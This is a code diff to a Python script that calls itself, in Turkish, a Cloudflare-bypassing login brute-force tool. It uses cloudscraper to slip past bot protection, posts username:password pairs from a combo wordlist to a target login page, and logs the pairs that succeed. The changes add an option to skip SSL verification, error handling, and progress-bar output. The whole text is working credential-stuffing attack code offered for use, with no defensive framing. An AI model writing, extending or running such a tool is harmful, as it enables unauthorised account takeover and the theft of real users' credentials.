@@ -5,6 +5,7 @@ import sys
 from tqdm import tqdm
 import time
 from colorama import Fore, Style, init
+import requests
 
 init(autoreset=True)
 
@@ -12,13 +13,19 @@ init(autoreset=True)
 parser = argparse.ArgumentParser(description="Cloudflare destekli login brute force aracı (combo wordlist)")
 parser.add_argument('--url', required=True, help='Hedef login sayfası URL')
 parser.add_argument('--combo', required=True, help='Combo wordlist dosyası (username:password)')
+parser.add_argument('--no-verify', action='store_true', help='SSL sertifika doğrulamasını atla')
 args = parser.parse_args()
+
+# SSL uyarısını bastır
+if args.no_verify:
+    requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)
 
 # Cloudflare korumalı siteye istek atmak için cloudscraper kullan
 scraper = cloudscraper.create_scraper()
+ssl_verify = not args.no_verify
 
 try:
-    response = scraper.get(args.url)
+    response = scraper.get(args.url, verify=ssl_verify)
     if response.status_code != 200:
         print(f"[!] Hedefe erişilemedi! HTTP {response.status_code}")
         sys.exit(1)
@@ -95,10 +102,16 @@ for field in input_fields:
         name = field.get('name') or field.get('id')
         if name and field.get('value'):
             sample_data[name] = field.get('value')
-fail_resp = scraper.post(args.url, data=sample_data, allow_redirects=True)
-fail_signatures.append(fail_resp.text[:1000])  # İlk 1000 karakteri referans al
-fail_status = fail_resp.status_code
-fail_url = fail_resp.url
+try:
+    fail_resp = scraper.post(args.url, data=sample_data, allow_redirects=True, verify=ssl_verify)
+    fail_signatures.append(fail_resp.text[:1000])  # İlk 1000 karakteri referans al
+    fail_status = fail_resp.status_code
+    fail_url = fail_resp.url
+except Exception as e:
+    print(f"[!] Başarısız giriş referansı alınamadı, manuel kontrol gerekebilir. Hata: {e}")
+    fail_status = 0
+    fail_url = ""
+
 
 success_count = 0
 tried_count = 0
@@ -116,15 +129,18 @@ try:
                         data[name] = field.get('value')
             tried_count += 1
             try:
-                resp = scraper.post(args.url, data=data, allow_redirects=True)
+                resp = scraper.post(args.url, data=data, allow_redirects=True, verify=ssl_verify)
             except Exception as e:
-                print(f"[!] Hata: {e}")
+                # tqdm barında hatayı göstermek için
+                pbar.set_postfix_str(f"Hata: {e}", refresh=True)
+                time.sleep(0.1)
                 pbar.update(1)
                 continue
             # Başarı tespiti: içerik değişimi, yönlendirme, HTTP kodu
-            if (resp.text[:1000] not in fail_signatures) or (resp.status_code != fail_status) or (resp.url != fail_url):
+            if (resp.status_code != fail_status) or (resp.url != fail_url) or (fail_signatures and resp.text[:1000] not in fail_signatures):
                 success_count += 1
-                print(Fore.GREEN + Style.BRIGHT + f"[!!!] BAŞARILI: {username}:{password}")
+                # tqdm barını durdurmadan print yapmak için
+                tqdm.write(Fore.GREEN + Style.BRIGHT + f"[!!!] BAŞARILI: {username}:{password}")
                 success_log.write(f"{username}:{password}\n")
                 success_log.flush()
             pbar.update(1)
